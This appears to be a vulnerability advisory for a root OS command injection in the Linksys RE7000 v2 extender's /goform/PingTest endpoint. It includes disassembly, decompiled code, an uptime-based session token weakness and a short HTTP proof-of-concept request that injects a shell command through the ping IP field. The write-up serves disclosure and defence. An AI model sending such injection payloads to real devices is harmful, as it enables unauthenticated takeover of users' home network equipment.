# Linksys RE7000 v2 /goform/PingTest OS Command Injection

## 1. Vulnerability Name

**Linksys RE7000 v2 Firmware v2.0.15 /goform/PingTest OS Command Injection (Root)**

## 2. Basic Information

| Field | Content |
| --- | --- |
| **Vendor** | Linksys (Belkin) |
| **Product** | RE7000 v2 AC1900+ Wi-Fi Range Extender |
| **Firmware Version** | v2.0.15 |
| **Firmware File** | RE7000v2_PROD_FW_v2.0.15_211230_1012.bin |

## 3. Vulnerability Principle & Data Flow

`/goform/PingTest` is rewritten by lighttpd to `/cgi-bin/json.cgi?PingTest` and ultimately reaches the `platform_event_pingTest` function in `libcbtjson.so`. This function reads attacker-controllable parameters `pingTestIp`, `pingTestPktSize`, `pingTestTimes` via `get_value_nvram()`, concatenates them into a `ping` command string with `snprintf()` (`ping %s -s %s -c %s ...`), and passes the result to `system()`. The server performs no effective whitelist validation or shell-metacharacter filtering on `pingTestIp`, so shell metacharacters are interpreted, resulting in OS command injection executed with root privileges.

Additionally, `createSessionId()` generates the session token from system uptime (`%020ld(getSysUptime())`) with insufficient randomness, and `/goform/*` is not within the lighttpd path-level authentication scope (auth relies solely on `checkAuthorization()` inside `json.cgi`). Combined with uptime leakage, this can approach unauthenticated RCE.

```
PUT /goform/PingTest
        │  Cookie: session_id=<predicted_uptime>
        │  Body: {"pingIp":"127.0.0.1; <CMD> #","pingSize":"32","pingTimes":"5"}
        ▼
lighttpd rewrite → /cgi-bin/json.cgi?PingTest
        │
        ▼
json.cgi: checkAuthorization() → passes (weak token)
        │
        ▼
setter() → set_value() → NVRAM write pingTestIp = "127.0.0.1; <CMD> #"
        │
        ▼
exec_event() → event_ping_test() → platform_event_pingTest()
        │
        ▼
snprintf("ping 127.0.0.1; <CMD> # -s 32 -c 5 ...")
        │
        ▼
system() → injected command executed as root
```

## 4. Key Functions

| Function | File | Address | Role |
| --- | --- | --- | --- |
| `checkAuthorization` | json.cgi | `0x407428` | Reads `session_id` Cookie via `getCookieValue`, checks against `/tmp/sessionid` |
| `createSessionId` | json.cgi | `0x4047fc` | Builds session token via `snprintf("%020ld", getSysUptime())` — weak/predictable |
| `getSysUptime` | json.cgi | `0x4047a4` | Returns system uptime (basis for token) |
| `get_key_group` | libcbtjson.so | `0x7d88` | Looks up `PingTest` group in `key_group_table` |
| `exec_event` | libcbtjson.so | `0xc9cc` | Dispatches pending events via `eventAction` table |
| `event_ping_test` | libcbtjson.so | `0xd310` | Calls `platform_event_pingTest()` |
| `platform_event_pingTest` | libcbtjson.so | `0x15728` | **Sink** — 3× `get_value_nvram`, `snprintf` into `ping` cmd, `system()` |

### platform_event_pingTest @ 0x15728 — command-injection sink (confirmed strings)

```asm
; platform_event_pingTest @ 0x15728 (MIPS32 LE, libcbtjson.so)
; get_value_nvram(0, "pingTestIp", v3, 16)
0x00015748:  addiu    $v0, $fp, 0x64        ; buf v3
0x00015750:  lw       $v1, -0x7fd8($gp)
0x00015758:  addiu    $a1, $v1, -0x29a8     ; "pingTestIp" (va 0x3d658)
0x00015760:  addiu    $a3, $zero, 0x10      ; len 16
0x00015770:  jalr     $t9                   ; get_value_nvram(...)
; get_value_nvram(0, "pingTestPktSize", v4, 6)
0x0001577c:  addiu    $v0, $fp, 0x74
0x0001578c:  addiu    $a1, $v1, -0x299c     ; "pingTestPktSize" (va 0x3d664)
0x00015794:  addiu    $a3, $zero, 6
0x000157a4:  jalr     $t9                   ; get_value_nvram(...)
; get_value_nvram(0, "pingTestTimes", v5, 3)
0x000157b0:  addiu    $v0, $fp, 0x7c
0x000157c0:  addiu    $a1, $v1, -0x298c     ; "pingTestTimes" (va 0x3d674)
0x000157c8:  addiu    $a3, $zero, 3
0x000157d8:  jalr     $t9                   ; get_value_nvram(...)
...
; if (times == "0")
0x00015830:  addiu    $a1, $v0, -0x2d00     ; "0" (va 0x3d300)
0x00015840:  jalr     $t9                   ; strcmp(times, "0")
0x0001584c:  bnez     $v0, 0x1589c          ; != "0" -> else branch
; snprintf(cmd, 0x40, "ping %s -s %s 2>&1 >/tmp/ping.log", ip, size)
0x0001585c:  addiu    $v1, $v0, -0x297c     ; fmt1 (va 0x3d684)
0x00015888:  jalr     $t9                   ; snprintf(...)
; else snprintf(cmd, 0x40, "ping %s -s %s -c %s 2>&1 >/tmp/ping.log", ip, size, times)
0x000158a4:  addiu    $v1, $v0, -0x2958     ; fmt2 (va 0x3d6a8)
0x000158d8:  jalr     $t9                   ; snprintf(...)
; system(cmd)
0x00015988:  lw       $a0, 0x20($fp)        ; arg0 = cmd buffer
0x0001598c:  lw       $v0, -0x7e58($gp)     ; GOT -> system
0x00015998:  jalr     $t9                   ; system(cmd)  ← ROOT EXECUTION
```

Resolved format strings (rodata base `0x40000`, verified):

| Address | String |
| --- | --- |
| `0x3d658` | `pingTestIp` |
| `0x3d664` | `pingTestPktSize` |
| `0x3d674` | `pingTestTimes` |
| `0x3d684` | `ping %s -s %s 2>&1 >/tmp/ping.log` |
| `0x3d6a8` | `ping %s -s %s -c %s 2>&1 >/tmp/ping.log` |

```c
// decompiled platform_event_pingTest @ 0x15728
get_value_nvram(0, "pingTestIp",      v3, 16);   // attacker-controlled
get_value_nvram(0, "pingTestPktSize", v4, 6);
get_value_nvram(0, "pingTestTimes",   v5, 3);
if (v3[0] && v4[0] && v5[0]) {
    if (!strcmp(v5, "0"))
        snprintf(v2, 0x40, "ping %s -s %s 2>&1 >/tmp/ping.log", v3, v4);
    else
        snprintf(v2, 0x40, "ping %s -s %s -c %s 2>&1 >/tmp/ping.log", v3, v4, v5);
    system(v2);   // ← root execution, %s = attacker-controlled
}
```

### createSessionId @ 0x4047fc — uptime-based weak token (confirmed strings)

```asm
; createSessionId @ 0x4047fc (MIPS32 LE, json.cgi)
0x00404828:  slti     $v0, $v0, 0x14        ; if (size < 20) return 0
0x00404840:  jal      0x4047a4              ; getSysUptime()
0x0040484c:  sw       $v0, 0x18($fp)        ; save uptime
0x00404854:  lui      $v0, 0x41
0x00404858:  addiu    $v0, $v0, -0x7464     ; "%020ld" (va 0x408b9c)
0x00404868:  lw       $a3, 0x18($fp)        ; arg3 = uptime
0x00404878:  jalr     $t9                   ; snprintf(buf, size, "%020ld", uptime)
0x00404888:  addiu    $v1, $v0, -0x7490     ; "/tmp/sessionid" (va 0x408b70)
0x00404890:  addiu    $v0, $v0, -0x745c     ; "w+" (va 0x408ba4)
0x004048a8:  jalr     $t9                   ; fopen("/tmp/sessionid", "w+")
0x004048f0:  jalr     $t9                   ; fputs(token, fp)
```

```c
// decompiled createSessionId @ 0x4047fc
sysUptime = getSysUptime();
snprintf(a1, a2, "%020ld", sysUptime);   // token = uptime, zero-padded to 20 digits
stream = fopen("/tmp/sessionid", "w+");
fputs(a1, stream);                       // stored for strcmp in checkAuthorization
```

### checkAuthorization @ 0x407428 — session_id check (confirmed strings)

```asm
; checkAuthorization @ 0x407428 (MIPS32 LE, json.cgi)
0x0040747c:  lw       $a0, 0x58($fp)        ; arg0 = Cookie header
0x00407484:  addiu    $a1, $v0, -0x6c2c     ; "session_id" (va 0x4093d4)
0x00407488:  addiu    $v0, $fp, 0x18        ; out buf
0x00407490:  addiu    $a3, $zero, 0x32      ; len 50
0x00407494:  jal      0x4072dc              ; getCookieValue(cookie, "session_id", buf, 50)
0x004074b0:  bal      0x40464c              ; checkNonceTimeout()
0x004074bc:  beqz     $v0, 0x4074f0         ; nonce ok -> continue
0x004074c8:  addiu    $a0, $v0, -0x6c20     ; "echo 4 > /tmp/login_st" (va 0x4093e0)
0x004074d8:  jalr     $t9                   ; system("echo 4 > /tmp/login_st")
...
0x004074f8:  jalr     $t9                   ; strlen(session_id)
0x00407528:  bal      0x404764              ; checkAuth(session_id, len)
0x00407534:  beqz     $v0, 0x407568         ; auth fail -> continue
0x00407540:  addiu    $a0, $v0, -0x6c08     ; "echo 3 > /tmp/login_st" (va 0x4093f8)
0x00407550:  jalr     $t9                   ; system("echo 3 > /tmp/login_st")
0x0040755c:  addiu    $v0, $zero, 1         ; return 1 (auth OK)
```

```c
// decompiled checkAuthorization @ 0x407428
getCookieValue(a1, "session_id", v3, 50);   // extract session_id from Cookie
if (checkNonceTimeout()) {
    system("echo 4 > /tmp/login_st");       // nonce expired
    return;
}
if (checkAuth(v3, strlen(v3))) {
    system("echo 3 > /tmp/login_st");       // auth success
    return 1;
}
```

> `checkAuth` compares the Cookie's `session_id` against the file `/tmp/sessionid`, whose contents are the uptime-derived token written by `createSessionId`. Since uptime is sequential and may leak via `/SysInfo.htm`, the token is predictable and the command injection approaches unauthenticated RCE.

## 5. Test PoC

```http
PUT /goform/PingTest HTTP/1.1
Host: <TARGET>
Cookie: session_id=00000000000000012345
Content-Type: application/json

{"pingIp":"127.0.0.1; id >/tmp/x","pingSize":"32","pingTimes":"5"}
```
